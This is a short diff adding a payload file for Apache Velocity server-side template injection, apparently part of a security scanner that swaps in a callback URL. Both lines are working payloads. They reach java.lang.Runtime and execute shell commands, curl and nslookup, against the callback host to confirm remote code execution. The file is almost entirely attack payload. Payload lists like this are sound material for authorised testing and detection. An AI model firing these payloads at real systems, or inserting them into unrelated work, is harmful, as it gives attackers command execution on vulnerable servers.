@@ -1,0 +1,4 @@
+# Velocity SSTI payloads - Java template engine (Apache Velocity)
+# {{CALLBACK}} replaced with callback URL
+#set($rt=$class.forName("java.lang.Runtime").getRuntime())$rt.exec("curl {{CALLBACK}}")
+#set($cmd="nslookup {{CALLBACK}}")#set($rt=@java.lang.Runtime@getRuntime())$rt.exec($cmd)
